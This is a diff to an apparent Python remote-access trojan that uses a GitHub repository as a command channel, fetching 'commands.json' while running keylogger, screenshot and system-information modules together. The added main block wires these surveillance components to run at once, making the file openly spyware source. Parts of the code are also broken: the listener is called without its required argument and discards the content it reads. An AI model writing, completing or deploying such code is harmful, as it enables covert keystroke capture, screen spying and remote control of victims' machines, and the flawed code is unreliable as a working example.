@@ -4,11 +4,13 @@ g = Github(access_token)
 user = g.get_user()
 repo = user.get_repo('python_development')
 
+
 from keylogger import Keylogger
 from sysinfo import SysInfo
 from screenshot import Screenshot
 import psutil
 import time
+import json
 
 
 def mod_keylogger():
@@ -23,3 +25,13 @@ def mod_sysinfo():
 def mod_screenshotter():
     s = Screenshot()
     s.auto_screen()
+
+def command_listener(file):
+    contents = repo.get_contents("commands.json")
+    contents.decoded_content
+
+if __name__ == '__main__':
+    command_listener()
+    mod_screenshotter()
+    mod_sysinfo()
+    mod_keylogger()
